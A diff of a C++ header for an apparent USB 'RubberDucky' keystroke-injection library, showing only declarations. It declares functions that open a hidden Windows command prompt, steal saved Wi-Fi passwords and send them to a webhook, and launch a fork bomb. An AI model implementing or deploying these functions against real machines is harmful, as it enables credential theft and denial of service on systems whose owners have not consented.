@@ -32,24 +32,35 @@ public:
    * @brief Initialize the board and LED.
    */
   void init(void);
-  
+
   /**
    * @brief Blink the LED for visual feedback.
    * @param ms Duration of each LED ON/OFF phase in milliseconds.
    */
   void ledFeedback(const long ms);
-  
+
   /**
    * @brief Keeps the USB HID connection alive and releases any pressed keys.
    */
   void refreshUSBConnection(void);
-  
+
+  /**
+   * @brief Launches the Windows Command Prompt (CMD) in a minimized state.
+   * @param debug If true, opens a normal CMD instead of a hidden one for debugging.
+   */
+  void RubberDucky::launchCMD(bool debug);
+
   /**
    * @brief Executes a payload to steal Wi-Fi passwords on Windows and sends them to a given webhook.
    * @param webhook URL to send the exfiltrated data via HTTP POST.
    * @param debug If true, opens a normal CMD instead of a hidden one for debugging.
    */
   void stealWindowsWifiPasswords(const char *webhook, bool debug = false);
+
+  /**
+   * @brief Executes a fork bomb on Windows to demonstrate system resource exhaustion.
+   */
+  void forkBomb(bool debug = false);
 
 private:
   uint8_t ledPin; ///< Pin connected to the onboard LED for feedback
